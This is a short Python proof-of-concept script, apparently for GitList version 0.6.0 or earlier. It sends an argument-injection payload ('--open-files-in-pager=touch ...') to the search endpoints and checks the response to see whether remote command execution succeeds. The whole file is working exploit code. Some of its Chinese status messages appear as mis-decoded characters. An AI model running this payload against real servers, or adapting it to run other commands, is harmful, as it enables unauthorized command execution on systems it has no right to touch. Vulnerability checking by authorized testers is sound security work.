#!/usr/bin/python
# _*_ coding:gbk _*_

import sys
import requests
import json

print("+         Please run this POC with Python 3            +")
print("+ Detection of GitList version <= 0.6.0  vulnerability +")
try:
    url = input("Please enter the target address:port,for example£ºwww.baidu.com or 192.168.1.1:8081,Ä¬ÈÏ¶Ë¿ÚÎª80\n")
    path = ['/example/tree/b/search', '/example/tree/a/search']
    http_url = "http://" + url
    path_len = len(path)
    n = 0
    while n < path_len:
        target = "http://" + url + path[n]
        print("target: %s\n" % (target))
        payload = {"query": "--open-files-in-pager=touch /tmp/success%d;" % (n)}
        headers = {
            "Host": url,
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
            "Accept-Encoding": "gzip, deflate",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": http_url,
            "Referer": http_url + "/example/"
            }
        #proxies = {"http": "127.0.0.1:8080"}
        ##data=payload, headers=headers, proxies=proxies
        req = requests.post(url=target, data=payload, headers=headers, timeout=2)
        if '--open-files-in-pager' in req.text:
            print('gitlist 0.6.0_b_param Ô¶³ÌÃüÁîÖ´ÐÐÂ©¶´´æÔÚ')
            sys.exit()
        n += 1
    print('gitlist 0.6.0_b_param Ô¶³ÌÃüÁîÖ´ÐÐÂ©¶´²»´æÔÚ')
    sys.exit()
except Exception as Error:
        print("Target cannot be accessed")
        sys.exit(1)
